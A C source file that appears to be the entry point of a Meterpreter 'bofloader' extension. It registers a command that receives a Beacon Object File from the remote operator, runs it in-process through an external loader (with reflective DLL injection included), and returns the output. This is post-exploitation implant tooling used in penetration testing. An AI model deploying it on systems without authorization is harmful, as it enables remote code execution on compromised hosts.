/*!
 * @file main.c
 * @brief Entry point for the bofloader extension.
 */

#include "common.h" 
#include "common_metapi.h" 
#include <stdint.h>
#include "main.h"

// Required so that use of the API works.
MetApi* met_api = NULL;

#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

typedef int (*goCallback)(char *, int);
extern int LoadAndRun(char *argsBuffer, uint32_t bufferSize, goCallback callback);
extern char * BeaconGetOutputData(int *outsize);

DWORD request_exec_cmd(Remote *remote, Packet *packet);

/*! @brief The enabled commands for this extension. */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_BOFLOADER_EXEC_CMD, request_exec_cmd),
	COMMAND_TERMINATOR
};

/*!
 * @brief Handler for the generic command execution function.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */

DWORD request_exec_cmd(Remote *remote, Packet *packet)
{
	DWORD result = ERROR_SUCCESS;
	int outdata_size = 0;
	DWORD buffer_size = 0;
	Packet * response = met_api->packet.create_response(packet);
	char * output_data = NULL;
	char * args_buffer = NULL;

	if (NULL == response)
	{
		met_api->packet.destroy(response);
		return ERROR_OUTOFMEMORY;
	}

	buffer_size = packet->payloadLength;
	args_buffer = (char *) met_api->packet.get_tlv_value_raw(packet, TLV_TYPE_BOFLOADER_CMD_EXEC, &buffer_size);

	if (args_buffer != NULL)
	{

		if (LoadAndRun(args_buffer, (uint32_t)buffer_size, NULL))
		{
			result = ERROR_BAD_COMMAND;
		}
		else
		{
			output_data = BeaconGetOutputData(&outdata_size);
		}
		
		if (output_data)
		{
			met_api->packet.add_tlv_string(response, TLV_TYPE_BOFLOADER_CMD_RESULT, output_data);
		}

	}
	else
	{
		result = ERROR_INVALID_PARAMETER;
	}

	dprintf("[BOFLOADER] Finished executing, if success will recv output data.");
	met_api->packet.transmit_response(result, remote, response);

	if (NULL != response)
		met_api->packet.destroy(response);
	if (NULL != packet)
		met_api->packet.destroy(packet);
	dprintf("[BOFLOADER] Done.");

	return ERROR_SUCCESS;
}

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;
	SET_LOGGING_CONTEXT(api)

	met_api->command.register_all(customCommands);


	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}
